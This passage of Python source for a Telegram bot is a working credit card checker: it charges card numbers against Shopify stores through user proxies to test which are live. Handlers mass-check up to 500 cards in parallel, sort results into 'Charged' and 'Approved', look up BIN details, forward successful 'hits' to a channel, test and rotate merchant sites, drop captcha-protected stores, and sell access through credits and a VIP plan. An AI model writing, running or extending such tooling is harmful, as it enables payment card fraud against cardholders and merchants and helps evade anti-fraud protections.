        # Extract card from entire message text using extract_card function
        card = extract_card(event.raw_text)
        
        if not card:
            await event.reply("Format ➜ /psh 4111111111111111|12|2025|123\n\nOr reply to a message containing credit card info")
            return
    
    # Get user's proxy
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ No proxy set! Use /setpx first.\n\n/psh requires proxy.")
        return
    
    # Check if main group (free access)
    if event.chat_id == GROUP_ID:
        pass  # FREE
    else:
        # Check credits
        can_access, access_type = await can_use(event.sender_id, event.chat)
        if access_type == "banned":
            return await event.reply(banned_user_message(), link_preview=False)
        
        check_chat_id = event.chat.id
        if check_chat_id > 0:
            check_chat_id = int(f"-100{check_chat_id}")
        
        if not await check_credits_and_notify(event.sender_id, 1, check_chat_id):
            buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
            return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Deduct 1 credit
    success, remaining = await deduct_user_credits(event.sender_id, 1, "/psh", event.chat_id)
    if not success:
        return await event.reply("❌ **Credit deduction failed!**\n\n💡 Use /balance to check your credits", link_preview=False)
    
    # Initial loading message with animation
    loading_msg = None
    start_time = time.time()
    
    async def animate_loading():
        nonlocal loading_msg
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 0
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → Shopify charge $
- **Response**: {loading_states[i % 4]}"""
                if loading_msg is None:
                    loading_msg = await event.reply(current_msg, parse_mode="Markdown", link_preview=False)
                else:
                    await loading_msg.edit(current_msg, parse_mode="Markdown")
                await asyncio.sleep(0.4)
                i += 1
            except: break
    
    # Start animation
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        # Check card using GraphQL
        site_url = f"https://{site}" if not site.startswith("http") else site
        result = await charge_shopify_graphql(
            url=site_url,
            card=card,
            user_proxy=proxy_url
        )
        
        # Stop animation
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        
        if not result:
            await loading_msg.edit("❌ No response from gateway", parse_mode=None)
            return
        
        # Get BIN info with error handling
        try:
            bin_number = card.split("|")[0]
            brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
            if not brand or brand == "-":
                brand = bin_type = level = bank = country = flag = "-"
        except Exception as e:
            print(f"[PSH BIN] Error getting BIN info: {e}")
            brand = bin_type = level = bank = country = flag = "-"
        
        # Calculate time
        end_time = time.time()
        elapsed = round(end_time - start_time, 2)
        
        # Determine status
        response_text = result.get('Response', '')
        response_lower = response_text.lower()
        
        # Handle common errors
        if "site dead" in response_lower:
            response_text = "⚠️ Site Dead - Try different site using /seturl"
        elif "product empty" in response_lower:
            response_text = "⚠️ Site has no products - Try different site"
        elif "expecting value" in response_lower or "json" in response_lower:
            response_text = "Site Error - Invalid Response"
        elif not response_text or response_text.strip() == "":
            response_text = "Empty Response"
        
        if "thank you" in response_lower or "order_placed" in response_lower:
            status_display = "`Charged 💎`"
        elif any(key in response_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "invalid_cvc", "incorrect_cvc", "incorrect_zip"]):
            status_display = "APPROVED ❎"
        elif "site dead" in response_lower or "product empty" in response_lower:
            status_display = "Site Dead ⚠️"
        else:
            status_display = "Declined ❌"
        
        # Get user plan
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free"
        
        # Get price and gateway with defaults
        price = result.get('Price') or '-'
        gateway = result.get('Gateway') or 'Shopify Payments'
        
        # Get user info for display (clickable but no preview)
        try:
            user = await client.get_entity(event.sender_id)
            first_name = user.first_name if user.first_name else "User"
            # Format: [Name](link) - clickable without preview, no username shown
            checked_by = f"[{first_name}](tg://user?id={event.sender_id})"
        except:
            checked_by = "User"
        
        # Determine proxy status based on response (only proxy-specific errors)
        proxy_status = "Live! ⚡️"
        if "407" in response_text or "proxy auth" in response_lower or "proxy error" in response_lower or "proxy connection" in response_lower:
            proxy_status = "Dead ⛔️"
        
        # Format message (original style)
        msg = f"""```
✦ [$psh] [ #Self_Shopify ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {response_text}
**Price** → {price} 💸
**Gateway** → {gateway}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━━ ━ ━ 
**BIN Info**: {brand} - {bin_type} - {level}
**BANK**: {bank}
**Country**: {country.upper()} {flag}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━━ ━ ━ 
**Proxy** : {proxy_status}
**Checked By**: {checked_by} [{access_label}]
**Elapsed time**: {elapsed} seconds"""
        
        if loading_msg:
            await loading_msg.edit(msg, parse_mode='Markdown', link_preview=False)
        else:
            await event.reply(msg, parse_mode='Markdown', link_preview=False)
        
        # Forward hit to channel if Charged or Approved
        if "Charged" in status_display or "APPROVED" in status_display:
            try:
                user = await client.get_entity(event.sender_id)
                first_name = user.first_name if user.first_name else "User"
                # Clickable mention without preview, no username shown
                user_mention = f"[{first_name}](tg://user?id={event.sender_id})"
                
                hit_msg = f"""```✦ [$psh] [ #Proxy_Shopify ]```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {response_text}
**Price** → {price} 💸
**Gateway** → {gateway}

**𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:** {brand} - {bin_type} - {level}
**𝗕𝗮𝗻𝗸:** {bank}
**𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country.upper()} {flag}
👤 **User:** {user_mention}
🆔 **User ID:** {event.sender_id}"""
                
                await client.send_message(FORWARD_ID, hit_msg, parse_mode='Markdown', link_preview=False)
            except Exception as e:
                print(f"[HIT FORWARD] Error: {e}")
        
    except Exception as e:
        animation_running = False
        try:
            animation_task.cancel()
            await asyncio.wait_for(animation_task, timeout=0.5)
        except:
            pass
        
        if loading_msg:
            await loading_msg.edit(f"❌ Error: {str(e)}", parse_mode=None)
        else:
            await event.reply(f"❌ Error: {str(e)}", parse_mode=None)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]txturl(\s|$)'))
@require_membership
async def txturl_handler(event):
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check proxy (REQUIRED)
    user_id = str(event.sender_id)
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ Proxy required! Use /setpx to set proxy first.\n\nFormat: /setpx ip:port:user:pass")
        return
    
    # Check if GraphQL is available
    if not GRAPHQL_AVAILABLE:
        await event.reply("❌ GraphQL Gateway (api.py) not available!")
        return
    
    # Check if replying to a file
    text = ""
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.document:
            # Download and read file
            try:
                file_path = await reply_msg.download_media()
                with open(file_path, 'r', encoding='utf-8') as f:
                    file_content = f.read()
                
                # Limit to 100 sites from file
                file_lines = [line.strip() for line in file_content.split('\n') if line.strip()]
                if len(file_lines) > 100:
                    await event.reply(f"⚠️ **File contains {len(file_lines)} sites.**\n\n**Limit:** 100 sites per file\n**Processing:** First 100 sites only")
                    file_lines = file_lines[:100]
                
                text = '\n'.join(file_lines)
                
                import os
                os.remove(file_path)
            except Exception as e:
                await event.reply(f"❌ Error reading file: {e}")
                return
        else:
            text = event.text.strip()
    else:
        # Extract sites - accept multiline format with - prefix
        text = event.text.strip()
    
    # Split by newlines and spaces, handle both formats
    lines = text.split('\n')
    parts = []
    for line in lines:
        line = line.strip()
        # Remove leading dash and spaces
        if line.startswith('-'):
            line = line[1:].strip()
        # Split by spaces for inline format
        parts.extend(line.split())
    
    # Remove command from first part
    if parts and parts[0].lower() in ['/txturl', '.txturl']:
        parts = parts[1:]
    
    # Filter valid domains - accept any format (with or without https://)
    valid_parts = []
    for part in parts:
        part = part.strip().rstrip('.,;:!?')  # Remove trailing punctuation
        
        # Skip if empty after cleaning
        if not part:
            continue
        
        # Remove https://, http://, www. prefixes
        clean_part = part.replace('https://', '').replace('http://', '').replace('www.', '')
        
        # Skip common words and formatting
        if clean_part.lower() in ['txt', 'sites', 'linked', 'sync', 'site:', 'gateway:', 'shopify', 'payments', 'total', 'urls', 'added', 'for']:
            continue
        
        # Must look like a domain:
        # 1. Contains dot
        # 2. Reasonable length (>5)
        # 3. No HTML/special chars
        # 4. Not a price (starts with $)
        # 5. Contains letters (not just numbers and dots)
        if ('.' in clean_part and 
            len(clean_part) > 5 and
            not clean_part.startswith('$') and
            not clean_part.startswith('.') and
            not any(c in clean_part for c in ['<', '>', '[', ']', '~', '✦', '•', '⌯']) and
            any(c.isalpha() for c in clean_part)):  # Must contain at least one letter
            valid_parts.append(clean_part)  # Store cleaned version
    
    if len(valid_parts) < 1:
        await event.reply("❌ **Usage:** `/txturl site1.myshopify.com site2.myshopify.com`")
        return
    
    parts = valid_parts
    
    user_id = str(event.sender_id)
    start_time = time.time()
    
    wait_msg = await event.reply("🔍 **Checking sites...**\n\nPlease wait...")
    
    # Load existing sites
    all_sites = await load_txt_sites()
    user_sites = all_sites.get(user_id, [])
    existing_sites = {entry["site"]: entry for entry in user_sites}
    
    supported_sites = []
    skipped_sites = []
    dead_sites = []
    captcha_sites = []
    
    # Get user's proxy
    proxy_url = get_proxy(user_id)
    
    # Process sites in parallel for speed
    async def test_site(site):
        # Clean site URL
        site = site.replace('https://', '').replace('http://', '')
        if '/' in site:
            site = site.split('/')[0]
        
        # Skip if already exists
        if site in existing_sites:
            return {"status": "skipped", "site": site}
        
        try:
            # Test site with api.py
            site_url = f"https://{site}"
            result = await charge_shopify_graphql(
                url=site_url,
                card=TEST_CARD_TXT,
                user_proxy=proxy_url
            )
            
            if result and result.get("Response"):
                response = result.get("Response", "").lower()
                raw_response = result.get("Response", "")
                
                # Check for CAPTCHA first - reject site if captcha detected
                if "HCAPTCHA DETECTED" in raw_response.upper() or "CAPTCHA" in raw_response.upper():
                    return {
                        "status": "captcha",
                        "site": site,
                        "message": "Site has captcha protection"
                    }
                
                # Check if site is working (not critical error)
                critical_errors = [
                    "timeout", "exception", "site dead", "product empty",
                    "json_parse_error", "cart_create_error", "error"
                ]
                
                # Site is valid if Status is True OR response doesn't contain critical errors
                is_valid = result.get("Status") == True or not any(err in response for err in critical_errors)
                
                # Also check if price is available (not empty or "-")
                price = result.get("Price", "-")
                has_price = price and price != "-" and price.strip() != ""
                
                if is_valid and has_price:
                    gateway = result.get("Gateway", "Shopify")
                    gate_name = f"{gateway} ${price}"
                    
                    return {
                        "status": "added",
                        "site": site,
                        "gate": gate_name
                    }
                else:
                    # Site failed validation - mark as dead
                    return {"status": "dead", "site": site}
        except:
            pass
        return {"status": "dead", "site": site}
    
    # Test all sites in parallel
    tasks = [test_site(site) for site in parts]
    results = await asyncio.gather(*tasks)
    
    # Separate skipped, added, captcha, and dead sites
    for r in results:
        if r:
            if r.get("status") == "skipped":
                skipped_sites.append(r["site"])
            elif r.get("status") == "added":
                supported_sites.append({"site": r["site"], "gate": r["gate"]})
            elif r.get("status") == "captcha":
                captcha_sites.append(r["site"])
            elif r.get("status") == "dead":
                dead_sites.append(r["site"])
    
    if not supported_sites and not skipped_sites:
        # Build detailed failure message
        failure_msg = "❌ **No supported sites found!**\n\n"
        
        if captcha_sites:
            captcha_list = "\n".join([f"• `{s}`" for s in captcha_sites[:10]])
            failure_msg += f"**🔐 Captcha Protected ({len(captcha_sites)}):**\n{captcha_list}\n\n"
        
        if dead_sites:
            dead_list = "\n".join([f"• `{s}`" for s in dead_sites[:10]])
            failure_msg += f"**☠️ Dead Sites ({len(dead_sites)}):**\n{dead_list}\n\n"
        
        failure_msg += "**Note:** Sites with captcha protection cannot be added."
        
        await wait_msg.edit(failure_msg)
        return
    
    if not supported_sites and skipped_sites:
        skipped_list = "\n".join([f"• `{s}`" for s in skipped_sites])
        await wait_msg.edit(
            f"ℹ️ **All sites already added!**\n\n"
            f"**Skipped ({len(skipped_sites)}):**\n{skipped_list}"
        )
        return
    
    # Add new sites to user's list
    user_sites.extend(supported_sites)
    all_sites[user_id] = user_sites
    
    await save_txt_sites(all_sites)
    
    # Get user info
    try:
        user = await client.get_entity(event.sender_id)
        username = user.first_name if user.first_name else "User"
        user_username = user.username if user.username else None
        if user_username:
            clickable_name = f"<a href='tg://user?id={user_id}'>{username}</a>"
        else:
            clickable_name = username
    except:
        clickable_name = "User"
    
    # Format response
    elapsed = round(time.time() - start_time, 2)
    total_sites_now = len(user_sites)  # After adding new sites
    
    result_lines = [
        f"<pre>✦ [$ptxt Sites Added] [ #Shopify_Proxy ]</pre>",
        f"<b>Added Sites: {len(supported_sites)}</b>",
        "━━━━━━━━━━━━━"
    ]
    
    for idx, site_entry in enumerate(supported_sites, 1):
        result_lines.append(f"<b>{idx}. Site:</b> <code>{site_entry['site']}</code>")
        result_lines.append(f"   <b>Gateway:</b> {site_entry['gate']}\n")
    
    # Show skipped sites if any
    if skipped_sites:
        result_lines.append(f"<b>⚠️ Already Added ({len(skipped_sites)}):</b>")
        for skipped in skipped_sites:
            result_lines.append(f"• <code>{skipped}</code>")
        result_lines.append("")
    
    # Show captcha sites if any
    if captcha_sites:
        result_lines.append(f"<b>🔐 Captcha Protected ({len(captcha_sites)}):</b>")
        for captcha in captcha_sites:
            result_lines.append(f"• <code>{captcha}</code>")
        result_lines.append("")
    
    # Show dead sites if any
    if dead_sites:
        result_lines.append(f"<b>☠️ Dead Site ({len(dead_sites)}):</b>")
        for dead in dead_sites:
            result_lines.append(f"• <code>{dead}</code>")
        result_lines.append("")
    
    result_lines.append("━━━━━━━━━━━━━")
    result_lines.append(f"<b>Total Sites:</b> <code>{total_sites_now}</code>")
    result_lines.append(f"<b>Time Taken:</b> <code>{elapsed} sec</code>")
    
    full_msg = "\n".join(result_lines)
    
    # Check if message fits (4096 char limit)
    if len(full_msg) <= 4000:
        try:
            await wait_msg.edit(full_msg, parse_mode='html')
        except Exception as e:
            print(f"[TXTURL] Error editing message: {e}")
            await event.reply(full_msg, parse_mode='html')
    else:
        # If too long, split into multiple messages
        try:
            await wait_msg.delete()
        except:
            pass
        
        # Split message into chunks
        header = result_lines[:3]  # Header lines
        footer_start = len(result_lines) - 2  # Last 2 lines (Total, Time)
        
        # Send first part with sites
        chunk_size = 50  # Sites per message
        site_lines = []
        for idx, site_entry in enumerate(supported_sites, 1):
            site_lines.append(f"<b>{idx}. Site:</b> <code>{site_entry['site']}</code>")
            site_lines.append(f"   <b>Gateway:</b> {site_entry['gate']}\n")
        
        # Send in chunks
        for i in range(0, len(site_lines), chunk_size * 2):  # *2 because each site = 2 lines
            chunk = site_lines[i:i + chunk_size * 2]
            if i == 0:
                # First message with header
                msg = "\n".join(header + chunk)
            else:
                # Continuation messages
                msg = f"<pre>✦ [$ptxt Sites] (continued)</pre>\n" + "\n".join(chunk)
            
            try:
                await event.reply(msg, parse_mode='html')
            except Exception as e:
                print(f"[TXTURL] Error sending chunk: {e}")
        
        # Send footer with summary
        footer_msg = "\n".join([
            "━━━━━━━━━━━━━",
            f"<b>Total Sites:</b> <code>{total_sites_now}</code>",
            f"<b>Time Taken:</b> <code>{elapsed} sec</code>",
            f"<b>Req By:</b> {clickable_name}"
        ])
        
        if dead_sites:
            footer_msg = f"<b>☠️ Dead Sites ({len(dead_sites)}):</b>\n" + "\n".join([f"• <code>{d}</code>" for d in dead_sites[:20]]) + "\n\n" + footer_msg
        
        try:
            await event.reply(footer_msg, parse_mode='html')
        except Exception as e:
            print(f"[TXTURL] Error sending footer: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]txtls$'))
@require_membership
async def txtls_handler(event):
    """List all txt sites for user"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    user_id = str(event.sender_id)
    
    # Load sites
    all_sites = await load_txt_sites()
    user_sites = all_sites.get(user_id, [])
    
    if not user_sites:
        await event.reply("❌ **No txt sites found!**\n\nUse `/txturl` to add sites.")
        return
    
    # Get user info
    try:
        user = await client.get_entity(event.sender_id)
        username = user.first_name if user.first_name else "User"
        user_username = user.username if user.username else None
        if user_username:
            clickable_name = f"<a href='tg://user?id={user_id}'>{username}</a>"
        else:
            clickable_name = username
    except:
        clickable_name = "User"
    
    # Format response with pagination support (Telegram limit: 4096 chars)
    lines = [
        f"<pre>✦ [$ptxt Sites] [ #Shopify_Proxy ]</pre>",
        "━━━━━━━━━━━━━"
    ]
    
    # Build site list
    site_lines = []
    for idx, site_entry in enumerate(user_sites, 1):
        site_lines.append(f"<b>{idx}. Site:</b> <code>{site_entry['site']}</code>")
        site_lines.append(f"   <b>Gateway:</b> {site_entry['gate']}\n")
    
    # Add footer
    footer = [
        "━━━━━━━━━━━━━",
        f"<b>Total Sites:</b> <code>{len(user_sites)}</code>"
    ]
    
    # Check if message fits in one message (4096 char limit)
    full_message = "\n".join(lines + site_lines + footer)
    
    if len(full_message) <= 4000:  # Safe limit
        try:
            await event.reply(full_message, parse_mode='html')
        except Exception as e:
            print(f"[TXTLS] Error sending message: {e}")
    else:
        # Split into chunks (50 sites per message)
        chunk_size = 50  # Sites per message
        
        # Send in chunks
        for i in range(0, len(site_lines), chunk_size * 2):  # *2 because each site = 2 lines
            chunk = site_lines[i:i + chunk_size * 2]
            
            if i == 0:
                # First message with header
                msg = "\n".join(lines + chunk)
            else:
                # Continuation messages
                msg = f"<pre>✦ [$ptxt Sites] (continued)</pre>\n" + "\n".join(chunk)
            
            try:
                await event.reply(msg, parse_mode='html')
            except Exception as e:
                print(f"[TXTLS] Error sending chunk: {e}")
        
        # Send footer with summary
        footer_msg = "\n".join(footer)
        try:
            await event.reply(footer_msg, parse_mode='html')
        except Exception as e:
            print(f"[TXTLS] Error sending footer: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]txtrm(\s|$)'))
@require_membership
async def txtrm_handler(event):
    """Remove txt site by index, name, or multiple sites"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    user_id = str(event.sender_id)
    text = event.text.strip()
    
    # Load sites
    all_sites = await load_txt_sites()
    user_sites = all_sites.get(user_id, [])
    
    if not user_sites:
        await event.reply("❌ No sites to remove!")
        return
    
    # Extract sites to remove (support multiline and formatted output)
    lines = text.split('\n')
    sites_to_remove = []
    
    for line in lines:
        line = line.strip()
        
        # Skip command line
        if line.lower().startswith('/txtrm') or line.lower().startswith('.txtrm'):
            parts = line.split(maxsplit=1)
            if len(parts) > 1:
                # Check if it's "all"
                if parts[1].lower() == "all":
                    all_sites[user_id] = []
                    await save_txt_sites(all_sites)
                    await event.reply("✅ **All txt sites removed!**")
                    return
                sites_to_remove.append(parts[1])
            continue
        
        # Skip decorative lines
        if not line or line.startswith('✦') or line.startswith('━') or line.startswith('Total') or line.startswith('Checked'):
            continue
        
        # Extract site from formatted lines like "1. Site: nellitascraft.com"
        if 'Site:' in line:
            # Extract site name after "Site:"
            site_match = line.split('Site:', 1)
            if len(site_match) > 1:
                site_name = site_match[1].strip()
                sites_to_remove.append(site_name)
                continue
        
        # Skip gateway lines
        if 'Gateway:' in line:
            continue
        
        # Add non-empty lines as potential sites
        if line and not line.startswith(('•', '-', '*', '>', '<')):
            sites_to_remove.append(line)
    
    if not sites_to_remove:
        await event.reply(
            "❌ **Usage:**\n"
            "`/txtrm <index>` - Remove by index\n"
            "`/txtrm <site>` - Remove by site name\n"
            "`/txtrm all` - Remove all sites\n"
            "`/txtrm` (multiline) - Remove multiple sites\n\n"
            "Use `/txtls` to see site list"
        )
        return
    
    # Process removals
    removed_sites = []
    not_found = []
    
    for site_input in sites_to_remove:
        site_input = site_input.strip()
        
        # Try as index first
        try:
            index = int(site_input) - 1
            if 0 <= index < len(user_sites):
                removed_site = user_sites.pop(index)
                removed_sites.append(removed_site['site'])
                continue
        except ValueError:
            pass
        
        # Try as site name
        site_to_remove = site_input.replace('https://', '').replace('http://', '').replace('www.', '')
        
        # Find and remove site
        found = False
        for i, site_entry in enumerate(user_sites):
            if site_entry['site'].lower() == site_to_remove.lower():
                removed_site = user_sites.pop(i)
                removed_sites.append(removed_site['site'])
                found = True
                break
        
        if not found:
            not_found.append(site_to_remove)
    
    # Save changes
    if removed_sites:
        all_sites[user_id] = user_sites
        await save_txt_sites(all_sites)
    
    # Build response
    response = ""
    if removed_sites:
        response += f"✅ **Removed {len(removed_sites)} site(s):**\n"
        for site in removed_sites:
            response += f"• `{site}`\n"
    
    if not_found:
        response += f"\n❌ **Not found ({len(not_found)}):**\n"
        for site in not_found:
            response += f"• `{site}`\n"
    
    if not response:
        response = "❌ No sites removed!"
    
    await event.reply(response)

# ===== END TXT SITE MANAGEMENT COMMANDS =====

# ===== PTXT COMMANDS (Text File Mass Checking) =====


@client.on(events.NewMessage(pattern=r'(?i)^[/.]ptxt$'))
@require_membership
async def ptxt_handler(event):
    """Check cards from text file using proxy - VIP ONLY"""
    # Check if command is enabled
    if not is_command_enabled("ptxt"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if in auth group (GROUP_ID) - free access for all
    if event.chat_id == GROUP_ID:
        pass  # Free access in auth group
    else:
        # Outside auth group - VIP only
        user_data = await get_user_credits(event.sender_id)
        user_plan = user_data.get('plan', 'Free')
        
        if user_plan != 'VIP' and event.sender_id not in ADMIN_ID:
            buttons = [[Button.url("Use free in auth group ✅", "https://t.me/+zsDNOaFO-_tlZjA1")]]
            return await event.reply(
                "❌ **VIP Plan Required!**\n\n"
                "/ptxt command requires VIP plan.\n\n"
                "💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!",
                buttons=buttons,
                link_preview=False
            )
    
    # Get user's proxy (REQUIRED)
    user_id = str(event.sender_id)
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        await event.reply("❌ No proxy set! Use /setpx first.\n\n/ptxt requires proxy.")
        return
    
    # Get user's txt sites
    all_sites = await load_txt_sites()
    user_sites = all_sites.get(user_id, [])
    
    if len(user_sites) < 1:
        return await event.reply("❌ No txt sites found! Use `/txturl` to add sites first.")
    
    # Check if reply to document
    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a text file containing cards!\n\nUsage: Reply to .txt file and send /ptxt")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg.document and not replied_msg.text:
        return await event.reply("❌ Reply to a valid text file (.txt) or message with cards!")
    
    # If it's a text message (not document), extract cards directly
    if replied_msg.text and not replied_msg.document:
        content = replied_msg.text
        cards = extract_all_cards(content)
        
        if not cards:
            return await event.reply("❌ No valid cards found in message!")
        
        # Continue with processing
        max_cards = 500
        if len(cards) > max_cards:
            return await event.reply(f"⚠️ **Maximum {max_cards} cards allowed.**\n\nYou provided {len(cards)} cards.")
        
        # VIP users - no credit deduction, unlimited checks
        asyncio.create_task(process_ptxt_cards(event, cards, user_sites, proxy_url))
        return
    
    # Check if already running
    if event.sender_id in ACTIVE_PTXT_PROCESSES:
        return await event.reply("⏳ Your previous /ptxt is still running!")
    
    # Download and read file silently
    try:
        file_path = await replied_msg.download_media()
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        os.remove(file_path)
        
        # Extract cards
        cards = extract_all_cards(content)
        
        if not cards:
            await event.reply("❌ No valid cards found in file!")
            return
        
        # Limit cards
        max_cards = 500
        if len(cards) > max_cards:
            return await event.reply(f"⚠️ **Maximum {max_cards} cards allowed.**\n\nYou provided {len(cards)} cards.")
        
        # VIP users - no credit deduction, unlimited checks
        # Start processing with animation directly
        asyncio.create_task(process_ptxt_cards(event, cards, user_sites, proxy_url))
        
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

async def process_ptxt_cards(event, cards, sites, proxy_url):
    """Process ptxt cards - batch processing with summary"""
    user_id = event.sender_id
    
    # Mark as active
    ACTIVE_PTXT_PROCESSES[user_id] = True
    
    try:
        # VIP users - no credit deduction
        start_time = time.time()
        all_results = []
        
        # Get user info
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Step 1: Send "Preparing" message (Diamond Mining style)
        status_msg = await event.reply("```⛏️ 𝙈𝙞𝙣𝙞𝙣𝙜 𝙛𝙤𝙧 𝘿𝙞𝙖𝙢𝙤𝙣𝙙𝙨... 💎```", link_preview=False)
        
        checked_count = 0
        charged_count = 0
        approved_count = 0
        
        # Function to update progress (mtxt style with buttons)
        async def update_progress():
            elapsed = time.time() - start_time
            buttons = [
                [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged_count} ] 💎", b"none")],
                [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved_count} ] 🔥", b"none")],
                [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked_count}/{len(cards)}] ✅", b"none")],
                [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_ptxt:{user_id}".encode())]
            ]
            await status_msg.edit(
                "```⛏️ 𝙈𝙞𝙣𝙞𝙣𝙜 𝙞𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨... 💎```",
                buttons=buttons
            )
        
        # Initial progress update
        await update_progress()
        
        # Use semaphore for parallel processing (compress style)
        sem = asyncio.Semaphore(25)  # 25 parallel requests
        lock = asyncio.Lock()
        
        # Create check_card function
        async def check_card(idx, card):
            nonlocal checked_count, charged_count, approved_count
            
            async with sem:
                # Rotate site
                site_entry = sites[idx % len(sites)]
                site = site_entry["site"]
                gate = site_entry["gate"]
                site_url = f"https://{site}"
                
                try:
                    result = await charge_shopify_graphql(
                        url=site_url,
                        card=card,
                        user_proxy=proxy_url
                    )
                    
                    # Update progress counter
                    async with lock:
                        checked_count += 1
                        if checked_count % 25 == 0 or checked_count == len(cards):
                            await update_progress()
                    
                    if result:
                        # Determine status (original logic)
                        raw_response = result.get('Response', '')
                        
                        # Check for captcha - 3 strikes system
                        if "HCAPTCHA DETECTED" in raw_response.upper() or "CAPTCHA" in raw_response.upper():
                            # Track captcha strikes for this site
                            if not hasattr(site_entry, '__captcha_strikes__'):
                                site_entry['captcha_strikes'] = 0
                            
                            site_entry['captcha_strikes'] = site_entry.get('captcha_strikes', 0) + 1
                            
                            # If 3 strikes, remove site
                            if site_entry['captcha_strikes'] >= 3:
                                # Remove site from user's list
                                all_sites = await load_txt_sites()
                                user_sites_list = all_sites.get(str(event.sender_id), [])
                                
                                # Filter out the captcha site
                                new_user_sites = [s for s in user_sites_list if s.get("site") != site]
                                
                                if len(new_user_sites) < len(user_sites_list):
                                    all_sites[str(event.sender_id)] = new_user_sites
                                    await save_txt_sites(all_sites)
                                    
                                    await event.reply(
                                        f"⚠️ **Site Removed (3 Captcha Strikes)**\n\n"
                                        f"🔴 Site: `{site}`\n"
                                        f"📊 Remaining Sites: {len(new_user_sites)}",
                                        parse_mode='markdown'
                                    )
                                    
                                    # Update sites list for next iterations
                                    async with lock:
                                        sites.clear()
                                        sites.extend(new_user_sites)
                                    
                                    if not new_user_sites:
                                        await event.reply("❌ All sites removed. Checking stopped.")
                            
                            # Skip this card for now (don't count as checked)
                            return None
                        
                        if "ORDER_PLACED" in raw_response or "Thank You" in raw_response:
                            async with lock:
                                charged_count += 1
                            return ('charged', card, raw_response, gate, site)
                        elif any(keyword in raw_response for keyword in [
                            "3D CC", "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP", "INSUFFICIENT_FUNDS",
                            "INVALID_CVC", "INCORRECT_CVC", "3DS_REQUIRED", "MISMATCHED_BILL", "3D_AUTHENTICATION",
                            "INCORRECT_ZIP", "INCORRECT_ADDRESS"
                        ]):
                            async with lock:
                                approved_count += 1
                            return ('approved', card, raw_response, gate, site)
                        else:
                            return ('declined', card, raw_response, gate, site)
                    
                    return None
                    
                except Exception as e:
                    print(f"[PTXT] Error checking card: {e}")
                    return None
        
        # Create all tasks at once (compress style - 25 parallel)
        tasks = [asyncio.create_task(check_card(i, card)) for i, card in enumerate(cards)]
        
        # Wait for all tasks to complete
        for task in asyncio.as_completed(tasks):
            # Check if stopped
            if user_id not in ACTIVE_PTXT_PROCESSES:
                # Cancel remaining tasks
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            
            result = await task
            if result:
                status_type, card, raw_response, gate, site = result
                
                if status_type == 'charged':
                    status = "Charged 💎"
                elif status_type == 'approved':
                    status = "Approved ❎"
                else:
                    status = "Declined ❌"
                
                all_results.append({
                    'card': card,
                    'status': status,
                    'response': raw_response,
                    'gate': gate,
                    'site': site
                })
                
                # Send card message IMMEDIATELY for charged/approved (mtxt style)
                if status_type in ['charged', 'approved']:
                    # Get BIN info with error handling
                    try:
                        bin_number = card.split("|")[0]
                        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
                        # Verify data is valid
                        if not brand or brand == "-":
                            brand = bin_type = level = bank = country = flag = "-"
                    except Exception as e:
                        print(f"[PTXT BIN] Error getting BIN info: {e}")
                        brand = bin_type = level = bank = country = flag = "-"
                    
                    # Determine status display
                    if status_type == 'charged':
                        status_display = "`Charged 💎`"
                    else:
                        status_display = "APPROVED ❎"
                    
                    # mtxt style format
                    card_msg = f"""```✦ [$ptxt] [ #Auto_Shopify ]```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {raw_response}
**Gateway** → {gate}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}"""
                    
                    await event.reply(card_msg, link_preview=False)
                    
